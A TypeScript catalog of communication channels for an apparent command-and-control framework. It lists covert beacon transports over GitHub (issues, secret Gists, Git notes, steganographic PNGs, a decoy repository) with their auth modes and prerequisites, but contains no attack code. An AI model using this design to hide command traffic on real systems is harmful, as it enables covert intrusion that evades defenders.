/**
 * Canonical communication-channel catalog.
 *
 * A channel remains in this catalog when it is unavailable so every consumer
 * agrees on its identifier, display name, prerequisites, and security model.
 * Runtime code must inspect `implementationStatus`; presence in the catalog is
 * not proof that a channel is safe to select.
 */

export type ChannelId =
  | 1
  | 2
  | 3
  | 4
  | 5
  | 6
  | 7
  | "7b"
  | 8
  | 9
  | 10
  | 11
  | 12
  | 13;

export type ChannelImplementationStatus =
  | "implemented"
  | "experimental"
  | "unavailable";

export type ChannelAuthMode =
  | "github-fine-grained-token"
  | "github-app-installation-token"
  | "github-oidc"
  | "beacon-bearer"
  | "mutual-tls"
  | "ssh-certificate";

export type ChannelPrerequisite =
  | "repository-metadata-read"
  | "issues-read-write"
  | "contents-read-write"
  | "actions-read-write"
  | "variables-read-write"
  | "deployments-read-write"
  | "gist-read-write"
  | "pull-requests-read-write"
  | "oidc-id-token"
  | "codespace-ssh"
  | "default-branch"
  | "operator-encryption-public-key"
  | "controller-http-enabled"
  | "controller-grpc-enabled"
  | "server-tls-certificate"
  | "beacon-client-certificate"
  | "beacon-api-credential"
  | "proxy-repository"
  | "relay-configuration"
  | "server-channel-counterpart";

export interface ChannelDefinition {
  readonly id: ChannelId;
  readonly kind: string;
  readonly name: string;
  readonly transport: "github" | "http" | "grpc" | "relay";
  readonly implementationStatus: ChannelImplementationStatus;
  readonly authModes: readonly ChannelAuthMode[];
  readonly prerequisites: readonly ChannelPrerequisite[];
  readonly notes: string;
}

export const CHANNEL_CATALOG = [
  {
    id: 1,
    kind: "issues",
    name: "Issues",
    transport: "github",
    implementationStatus: "implemented",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "issues-read-write",
      "operator-encryption-public-key",
    ],
    notes: "Encrypted task and result exchange through issue comments.",
  },
  {
    id: 2,
    kind: "branch",
    name: "Branch",
    transport: "github",
    implementationStatus: "implemented",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "contents-read-write",
      "default-branch",
      "operator-encryption-public-key",
    ],
    notes: "Per-beacon branch and file transport; must bootstrap a missing branch.",
  },
  {
    id: 3,
    kind: "actions",
    name: "Actions",
    transport: "github",
    implementationStatus: "implemented",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "actions-read-write",
      "variables-read-write",
      "operator-encryption-public-key",
    ],
    notes: "Repository dispatch and Actions-variable transport.",
  },
  {
    id: 4,
    kind: "codespaces",
    name: "Codespaces",
    transport: "grpc",
    implementationStatus: "experimental",
    authModes: [
      "mutual-tls",
      "beacon-bearer",
      "ssh-certificate",
      "github-fine-grained-token",
    ],
    prerequisites: [
      "controller-grpc-enabled",
      "server-tls-certificate",
      "beacon-client-certificate",
      "beacon-api-credential",
      "codespace-ssh",
    ],
    notes: "Direct gRPC needs only mTLS and a beacon bearer; Codespaces API/SSH mode additionally requires an explicit user-scoped GitHub credential and never uses an App installation lease.",
  },
  {
    id: 5,
    kind: "pages",
    name: "Pages",
    transport: "github",
    implementationStatus: "experimental",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "deployments-read-write",
      "default-branch",
      "operator-encryption-public-key",
    ],
    notes: "Deployment/deployment-status transport; not tied to a hard-coded branch.",
  },
  {
    id: 6,
    kind: "gist",
    name: "Gists",
    transport: "github",
    implementationStatus: "implemented",
    authModes: ["github-fine-grained-token"],
    prerequisites: ["gist-read-write", "operator-encryption-public-key"],
    notes: "Encrypted task and result records stored in secret Gists. Controller and beacon require distinct Gist-capable tokens for the same dedicated GitHub account; the repository App lease is not used.",
  },
  {
    id: 7,
    kind: "oidc",
    name: "OIDC",
    transport: "http",
    implementationStatus: "experimental",
    authModes: ["github-oidc"],
    prerequisites: [
      "oidc-id-token",
      "controller-http-enabled",
      "server-tls-certificate",
      "server-channel-counterpart",
    ],
    notes: "GitHub Actions OIDC claims must bind repository, workflow, ref, and subject.",
  },
  {
    id: "7b",
    kind: "secrets",
    name: "Secrets",
    transport: "github",
    implementationStatus: "experimental",
    authModes: [
      "github-fine-grained-token",
      "github-app-installation-token",
    ],
    prerequisites: [
      "repository-metadata-read",
      "variables-read-write",
      "operator-encryption-public-key",
    ],
    notes: "Actions variables transport retained under its historical 7b identifier.",
  },
  {
    id: 8,
    kind: "pull_request",
    name: "PR+SSH",
    transport: "grpc",
    implementationStatus: "unavailable",
    authModes: [
      "github-fine-grained-token",
      "github-app-installation-token",
      "mutual-tls",
      "ssh-certificate",
    ],
    prerequisites: [
      "pull-requests-read-write",
      "controller-grpc-enabled",
      "server-tls-certificate",
      "beacon-client-certificate",
      "server-channel-counterpart",
    ],
    notes: "Reserved legacy catalog entry; no complete current transport implementation.",
  },
  {
    id: 9,
    kind: "stego",
    name: "Stego",
    transport: "github",
    implementationStatus: "experimental",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "contents-read-write",
      "default-branch",
      "operator-encryption-public-key",
      "server-channel-counterpart",
    ],
    notes: "Shared LSB PNG codec with implant/server counterparts; local signed round-trip is verified, while live GitHub integration remains external.",
  },
  {
    id: 10,
    kind: "proxy",
    name: "Proxy",
    transport: "github",
    implementationStatus: "experimental",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "proxy-repository",
      "repository-metadata-read",
      "operator-encryption-public-key",
    ],
    notes: "Wraps Issues in a distinct decoy repository through the signed relay workflow.",
  },
  {
    id: 11,
    kind: "notes",
    name: "Notes",
    transport: "github",
    implementationStatus: "implemented",
    authModes: ["github-fine-grained-token", "github-app-installation-token"],
    prerequisites: [
      "repository-metadata-read",
      "contents-read-write",
      "operator-encryption-public-key",
    ],
    notes: "Encrypted payloads transported through Git notes refs.",
  },
  {
    id: 12,
    kind: "relay",
    name: "Relay",
    transport: "relay",
    implementationStatus: "experimental",
    authModes: [
      "mutual-tls",
      "beacon-bearer",
      "ssh-certificate",
      "github-fine-grained-token",
    ],
    prerequisites: [
      "relay-configuration",
      "controller-grpc-enabled",
      "server-tls-certificate",
      "beacon-client-certificate",
      "beacon-api-credential",
    ],
    notes: "Explicitly provisioned relay consortium over authenticated gRPC/SSH; Codespaces discovery uses a runtime user credential, never a repository App lease.",
  },
  {
    id: 13,
    kind: "http",
    name: "HTTP",
    transport: "http",
    implementationStatus: "experimental",
    authModes: ["beacon-bearer"],
    prerequisites: [
      "controller-http-enabled",
      "server-tls-certificate",
      "beacon-api-credential",
    ],
    notes: "Opt-in direct HTTPS/WebSocket transport with header-only credentials.",
  },
] as const satisfies readonly ChannelDefinition[];

export type ChannelKind = (typeof CHANNEL_CATALOG)[number]["kind"];
export type ChannelCatalogEntry = (typeof CHANNEL_CATALOG)[number];

export const CHANNEL_KINDS = Object.freeze(
  CHANNEL_CATALOG.map((channel) => channel.kind),
) as readonly ChannelKind[];

export const CHANNEL_IDS = Object.freeze(
  CHANNEL_CATALOG.map((channel) => channel.id),
) as readonly ChannelId[];

export const SELECTABLE_CHANNEL_KINDS = Object.freeze(
  CHANNEL_CATALOG
    .filter((channel) => channel.implementationStatus !== "unavailable")
    .map((channel) => channel.kind),
) as readonly ChannelKind[];

export const CHANNEL_BY_KIND = Object.freeze(
  Object.fromEntries(CHANNEL_CATALOG.map((channel) => [channel.kind, channel])),
) as Readonly<Record<ChannelKind, ChannelCatalogEntry>>;

export const CHANNEL_BY_ID = Object.freeze(
  Object.fromEntries(CHANNEL_CATALOG.map((channel) => [String(channel.id), channel])),
) as Readonly<Record<string, ChannelCatalogEntry>>;

export function isChannelKind(value: unknown): value is ChannelKind {
  return typeof value === "string" &&
    Object.prototype.hasOwnProperty.call(CHANNEL_BY_KIND, value);
}

export function getChannelDefinition(kind: ChannelKind): ChannelCatalogEntry {
  return CHANNEL_BY_KIND[kind];
}

export function isSelectableChannel(kind: ChannelKind): boolean {
  return CHANNEL_BY_KIND[kind].implementationStatus !== "unavailable";
}
